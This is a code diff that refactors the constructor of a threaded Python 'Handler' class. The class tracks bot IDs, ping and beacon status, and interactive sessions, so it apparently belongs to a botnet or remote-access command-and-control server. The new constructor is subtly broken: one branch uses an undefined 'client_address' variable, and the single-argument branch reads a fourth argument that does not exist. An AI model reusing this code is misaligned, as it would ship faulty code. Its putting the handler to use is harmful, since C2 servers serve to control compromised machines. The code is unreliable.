@@ -11,25 +11,38 @@ import random
 
 class Handler(threading.Thread):
 
-    def __init__(self, client, client_address, bot_id, loggers):
-        threading.Thread.__init__(self)
-        self.loggers = loggers
-        self.client = client
-        self.client_address = client_address
-        self.ip = client_address[0]
-        self.port = client_address[1]
-        self.bot_id = bot_id
-        self.info = [self.bot_id,self.ip,self.port]
-        self.beacon_wait = False
-        self.os = ''
-        self.interactive = False
-        
-        self.status = ["UP","UP"]                           # <--UP - DOWN - ERR 
+    def __init__(self, *args):
+        #tcp signature
+        if len(args) == 4:
+            threading.Thread.__init__(self)
+            self.loggers = args[3]
+            self.client = args[0]
+            self.client_address = args[1]
+            self.ip = client_address[0]
+            self.port = client_address[1]
+            self.bot_id = args[2]
+            self.info = [self.bot_id,self.ip,self.port]
+            self.beacon_wait = False
+            self.os = ''
+            self.interactive = False
+
+            self.status = ["UP","UP"]                       # <--UP - DOWN - ERR 
                                                             # [0] = PING, [1] = BEACON
-
+        #http signature
+        elif len(args) == 1:
+            threading.Thread.__init__(self)
+            self.loggers = args[3]
+            self.ip = '127.0.0.1'
+            self.port = 5000
+            self.bot_id = args[0]
+            self.info = [self.bot_id,self.ip,self.port]
+            self.beacon_wait = False
+            self.os = ''
+            self.interactive = False
+            
+            self.status = ["UP","UP"]                       # <--UP - DOWN - ERR 
+                                                            # [0] = PING, [1] = BEACON
         # Log by
-
-
 
     def run(self):
 
